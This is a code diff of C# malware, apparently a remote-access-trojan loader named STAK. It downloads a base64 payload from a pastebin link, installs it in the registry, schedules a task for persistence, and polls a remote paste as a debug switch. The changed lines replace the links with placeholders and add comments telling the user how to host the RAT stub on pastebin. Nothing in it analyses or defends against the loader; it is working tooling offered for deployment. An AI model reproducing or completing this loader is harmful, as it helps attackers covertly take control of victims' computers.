@@ -43,7 +43,7 @@ namespace STAK
                 DialogResult result = MessageBox.Show("Run RAT?", "DEBUG-MODE", MessageBoxButtons.YesNo);
                 if (result == DialogResult.Yes)
                 {
-                    string Payload = DownloadPayload("YOUR-STUB-HERE"); // Look at my github page to find out how to place your RAT stub in here.
+                    string Payload = DownloadPayload("YOUR-LINK-HERE"); // Convert file to base64 and paste into pastebin. Put raw link here.
                     InstallRegistry(Payload);
                     AddToSchtasks();
                 }
@@ -54,7 +54,7 @@ namespace STAK
             }
             else
             {
-                string Payload = DownloadPayload("YOUR-STUB-HERE"); // Look at my github page to find out how to place your RAT stub in here.
+                string Payload = DownloadPayload("YOUR-LINK-HERE"); // Same as above.
                 InstallRegistry(Payload);
                 AddToSchtasks();
             }
@@ -86,7 +86,7 @@ namespace STAK
 
         private static void Checker()
         {
-            string url = ("https://pastebin.com/raw/qA3FzffP"); // Look at my github page to find out how to place your checker link in here.
+            string url = ("YOUR-LINK-HERE"); // Create paste on pastebin, put a 0 in it to turn debug mode off and put a 1 in to turn it on. Paste raw pastebin link here.
             string debug = new WebClient().DownloadString(url);
             if (debug == "1")
             {
